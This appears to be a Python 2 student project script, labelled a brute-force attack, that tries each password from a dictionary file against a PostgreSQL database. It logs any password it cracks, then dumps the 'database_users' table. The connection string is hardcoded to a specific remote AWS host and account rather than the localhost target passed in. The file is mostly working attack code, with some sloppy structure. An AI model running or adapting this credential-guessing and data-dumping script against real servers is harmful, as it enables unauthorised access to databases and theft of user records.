

""" Projet partie 2 : Script d'attaque par brute force """

""" Joel CORNET et Moise DOUARIN """


class bruteforce(object):

    global readFile
    
    def connect(self,host,port,base,user):
        self.host = host
        self.port = port
        self.base = base
        self.user = user
        
    def readFile(dictionnaire):
        dico = dictionnaire
        try:
            fd = open(dico, "r")
            password_list = fd.readlines()
            return password_list
        except IOError:
            print "File not found or corrupted !"

    def crackpassword(self,dictionnaire):
        self.dico = dictionnaire
        self.liste_pass = readFile(self.dico)
        result = open("PassFound.txt", "w")
        
        for self.password in self.liste_pass:
            try:
                self.engine = create_engine('postgresql://xkkepxphneumrj:'+self.password.strip()+'@ec2-54-197-238-8.compute-1.amazonaws.com:5432/d8okel9qt3b32h', echo=False)
                ##self.engine = create_engine('postgresql://'+self.user+':'+self.password.strip()+'@'+self.host+':'+self.port+'/'+self.base, echo=False)
                self.engine.connect()
                print("Password Cracked !\n")
                result.write("Password DB: {0}".format(self.password))
                break
            except:
                print("Cracking password ...")
            time.sleep(0.1)

        result.close()

        metadata = MetaData(self.engine)
        metadata.reflect(self.engine)
        metadata.tables.keys()
        users = Table('database_users', metadata, autoload=True)
        s = users.select()
        rs = s.execute()
        table = ()
        for row in rs:
            print row
            


import os
import sqlalchemy
import sys,time
from sqlalchemy import create_engine, MetaData, Table

if __name__ == "__main__":

    crack = bruteforce()
    crack.connect('127.0.0.1','5432','projetDjango','postgres')
    crack.crackpassword("DATAdico_parse_error_small.txt")

    r = open("PassFound.txt", "r")
    re = r.read()
    print("\n"+re)
    r.close()
    
           
        
